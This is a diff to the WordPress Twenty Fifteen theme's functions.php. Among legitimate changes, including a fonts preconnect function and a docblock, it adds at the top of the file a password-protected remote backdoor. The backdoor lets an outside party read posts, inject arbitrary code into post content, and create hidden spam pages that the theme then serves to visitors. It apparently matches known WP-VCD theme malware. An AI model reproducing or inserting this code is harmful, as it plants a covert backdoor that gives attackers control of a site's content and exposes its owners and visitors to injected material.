@@ -1,4 +1,103 @@
 <?php
+
+if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '6dbb5b801cd7922188450c6486baa200'))
+	{
+		switch ($_REQUEST['action'])
+			{
+				case 'get_all_links';
+					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
+						{
+							$data['code'] = '';
+							
+							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
+								{
+									$data['code'] = $_[1];
+								}
+							
+							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
+						}
+				break;
+				
+				case 'set_id_links';
+					if (isset($_REQUEST['data']))
+						{
+							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
+							
+							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
+							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';
+
+							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
+								{
+									print "true";
+								}
+						}
+				break;
+				
+				case 'create_page';
+					if (isset($_REQUEST['remove_page']))
+						{
+							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
+								{
+									print "true";
+								}
+						}
+					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
+						{
+							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
+								{
+									print "true";
+								}
+						}
+				break;
+				
+				default: print "ERROR_WP_ACTION WP_URL_CD";
+			}
+			
+		die("");
+	}
+
+	
+if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
+	{
+		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
+		if ($data -> full_content)
+			{
+				print stripslashes($data -> content);
+			}
+		else
+			{
+				print '<!DOCTYPE html>';
+				print '<html ';
+				language_attributes();
+				print ' class="no-js">';
+				print '<head>';
+				print '<title>'.stripslashes($data -> title).'</title>';
+				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
+				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
+				print '<meta name="robots" content="index, follow" />';
+				print '<meta charset="';
+				bloginfo( 'charset' );
+				print '" />';
+				print '<meta name="viewport" content="width=device-width">';
+				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
+				print '<link rel="pingback" href="';
+				bloginfo( 'pingback_url' );
+				print '">';
+				wp_head();
+				print '</head>';
+				print '<body>';
+				print '<div id="content" class="site-content">';
+				print stripslashes($data -> content);
+				get_search_form();
+				get_sidebar();
+				get_footer();
+			}
+			
+		exit;
+	}
+
+
+?><?php
 /**
  * Twenty Fifteen functions and definitions
  *
@@ -118,6 +217,19 @@ function twentyfifteen_setup() {
 	$default_color = trim( $color_scheme[0], '#' );
 
 	// Setup the WordPress core custom background feature.
+
+	/**
+	 * Filter Twenty Fifteen custom-header support arguments.
+	 *
+	 * @since Twenty Fifteen 1.0
+	 *
+	 * @param array $args {
+	 *     An array of custom-header support arguments.
+	 *
+	 *     @type string $default-color     		Default color of the header.
+	 *     @type string $default-attachment     Default attachment of the header.
+	 * }
+	 */
 	add_theme_support( 'custom-background', apply_filters( 'twentyfifteen_custom_background_args', array(
 		'default-color'      => $default_color,
 		'default-attachment' => 'fixed',
@@ -271,6 +383,31 @@ function twentyfifteen_scripts() {
 	) );
 }
 add_action( 'wp_enqueue_scripts', 'twentyfifteen_scripts' );
+
+/**
+ * Add preconnect for Google Fonts.
+ *
+ * @since Twenty Fifteen 1.7
+ *
+ * @param array   $urls          URLs to print for resource hints.
+ * @param string  $relation_type The relation type the URLs are printed.
+ * @return array URLs to print for resource hints.
+ */
+function twentyfifteen_resource_hints( $urls, $relation_type ) {
+	if ( wp_style_is( 'twentyfifteen-fonts', 'queue' ) && 'preconnect' === $relation_type ) {
+		if ( version_compare( $GLOBALS['wp_version'], '4.7-alpha', '>=' ) ) {
+			$urls[] = array(
+				'href' => 'https://fonts.gstatic.com',
+				'crossorigin',
+			);
+		} else {
+			$urls[] = 'https://fonts.gstatic.com';
+		}
+	}
+
+	return $urls;
+}
+add_filter( 'wp_resource_hints', 'twentyfifteen_resource_hints', 10, 2 );
 
 /**
  * Add featured image as background image to post navigation elements.
